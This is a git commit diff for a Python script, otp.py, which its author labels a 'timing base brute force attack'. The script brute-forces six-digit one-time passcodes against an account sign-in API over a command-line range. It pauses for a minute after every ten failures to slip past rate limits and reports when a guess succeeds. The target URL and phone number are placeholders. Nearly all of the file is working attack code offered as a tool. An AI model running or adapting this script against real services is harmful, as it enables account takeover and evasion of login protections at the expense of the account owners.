98fd6009c1b1ca28923130a284bbc9c4cf008791
Praveenprajith <Praveenprajith75@gmail.com>
2021-10-15 00:09:33 +0530

    Update otp.py
    timing base brute force  attack

--- otp.py
+++ otp.py
@@ -5,34 +5,76 @@ import os
 import json
 import sys
 import time
+import optparse
+
+
+parser = optparse.OptionParser()
+
+parser.add_option('-s', 
+    action="store", dest="start",
+    help="starting value", default="spam")
+
+parser.add_option('-e',
+    action="store", dest="end",
+    help="ending value", default="spam")
+
+options, args = parser.parse_args()
 
 # clean screen
 os.system("cls")
 os.system("clear")
 
+logo = '''
+                 ########################################
+                    ------- Devloper by Praveen kumar -----------
+                           Twitter : @Mr_x_strange
+                 ########################################
+'''
 # open session here connect 
 
+print (logo)
+print("Starting value ="+options.start)
+print("Ending value ="+options.end)
+print('')
 session = requests.Session()
-
 start = time.time()
 
-for i in range(1000,9999):
+m = int(options.start)
+e = int(options.end)
+count = 0
+for i in range(m,e):
     # loops Guess the numbers
-    number = "{:04d}".format(i)
-   
-    url = "https://sites-here/verifyPhone"
-    data = {"data":{"mobileNumber":"00000000000000000","code":number}} # enter number for change
-    header = {"Content-Type" : "application/json"}
+    number = "{:06d}".format(i)
+    url = "https://api.example.com/api/account/buyer/sign-in/"
+    data = {"mobile":"xxxxxxxxxx","country_code":"+91","otp":number,"signature":"sdfvsdvsd","mode":0} # enter number for change
+    header = {"Host": "xxxxxxxxxx","Content-Type" : "application/json","Accept": "application/json","Content-Length": "92",
+"Connection": "close"}
 
     request = session.post(url , data=json.dumps(data) , headers=header)
     
     re = request.text
-    
-    if request.status_code == 200:
+    if request.status_code == 201:
+        print('')
         if "success" in re:
-            print ("[+] OTP Number "+ str(i) + " success")
-            print("took script run on " ,time.time() - start)
+            print ("\033[0;32m OTP Number "+ str(i) + " success")
+            print('')
+            print('\033[0;32m' +request.text)   
+            print('')
+            print("\033[0;32m took script run on " ,time.time() - start)
             sys.exit(0)
         else: 
              print ("[-] OTP Number "+ str(i) + " Failure")
-print("took script run on " ,time.time() - start)        
+    else:
+         print('\033[0;31m'+number+" OTP invaild.... status code = "+str(request.status_code))  
+         count += 1
+         if count == 10:
+            print('')
+            print("Wait For one minute....")
+            time.sleep(60)
+            count = 0
+            print('')
+
+
+print('')
+print("took script run on " ,time.time() - start)   
+
